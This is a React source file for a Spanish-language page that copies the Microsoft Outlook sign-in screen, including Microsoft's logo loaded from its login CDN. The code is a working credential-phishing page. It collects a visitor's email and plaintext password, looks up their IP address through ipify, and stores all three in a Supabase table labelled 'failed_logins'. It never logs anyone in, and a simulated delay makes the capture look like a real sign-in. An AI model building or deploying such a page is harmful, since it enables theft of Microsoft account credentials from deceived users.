import React, { useState, useEffect } from 'react';
import { supabase } from './lib/supabase';

function App() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [ipAddress, setIpAddress] = useState<string | null>(null);

  useEffect(() => {
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => setIpAddress(data.ip))
      .catch(error => console.error('Error fetching IP:', error));
  }, []);

  const saveToDatabase = async () => {
    const timestamp = new Date().toISOString();
    const loginData = {
      email,
      password_attempt: password,
      ip_address: ipAddress,
      created_at: timestamp
    };

    // Save to failed_logins table
    const { error } = await supabase
      .from('failed_logins')
      .insert([loginData]);

    if (error) {
      console.error('Error saving data:', error);
    }
  };

  const handleNext = (e: React.FormEvent) => {
    e.preventDefault();
    setShowPassword(true);
  };

  const handleSignIn = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError('');

    try {
      if (password.length < 6) {
        setError('La contraseña debe tener al menos 6 caracteres');
        return;
      }

      // Simulate network delay
      await new Promise(resolve => setTimeout(resolve, 500));
      
      // Save data
      await saveToDatabase();

      // Reset form
      setEmail('');
      setPassword('');
      setShowPassword(false);
    } catch (error) {
      console.error('Error:', error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-4">
      <h1 className="text-[42px] font-semibold text-[#2b2b2b] tracking-tight leading-none mb-4">Outlook</h1>
      <div className="login-card">
        {error && (
          <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded-md">
            <p className="text-sm text-red-600">{error}</p>
          </div>
        )}
        {!showPassword ? (
          <form onSubmit={handleNext} className="flex flex-col">
            <div className="self-start mb-4">
              <img
                src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg"
                alt="Microsoft"
                className="h-6"
              />
            </div>
            <h1 className="text-2xl mb-1">Iniciar sesión</h1>
            <p className="text-sm text-gray-600 mb-4">para continuar a Outlook</p>
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="Email, teléfono o Skype"
              className="input-field mb-4"
              required
            />
            <div className="mb-4 text-sm">
              <span className="text-gray-600">¿No tiene una cuenta? </span>
              <button
                type="button"
                className="text-[#0078D4] hover:underline"
              >
                ¡Cree una!
              </button>
            </div>
            <div className="flex justify-end">
              <button
                type="submit"
                className="sign-in-button"
                disabled={!email || loading}
              >
                Siguiente
              </button>
            </div>
          </form>
        ) : (
          <form onSubmit={handleSignIn} className="flex flex-col">
            <div className="self-start mb-4">
              <img
                src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg"
                alt="Microsoft"
                className="h-6"
              />
            </div>
            <h1 className="text-2xl mb-4">Escribir contraseña</h1>
            <div className="mb-4">
              <p className="text-sm text-gray-600 mb-2">{email}</p>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Contraseña"
                className="input-field"
                required
                minLength={6}
              />
            </div>
            <div className="text-sm mb-6">
              <a href="#" className="text-[#0078D4] hover:underline">
                ¿Olvidó su contraseña?
              </a>
            </div>
            <div className="flex justify-between items-center">
              <button
                type="button"
                onClick={() => setShowPassword(false)}
                className="text-[#0078D4] hover:underline"
                disabled={loading}
              >
                Atrás
              </button>
              <button
                type="submit"
                className="sign-in-button"
                disabled={!password || loading}
              >
                {loading ? 'Iniciando sesión...' : 'Iniciar sesión'}
              </button>
            </div>
          </form>
        )}
      </div>
    </div>
  );
}

export default App;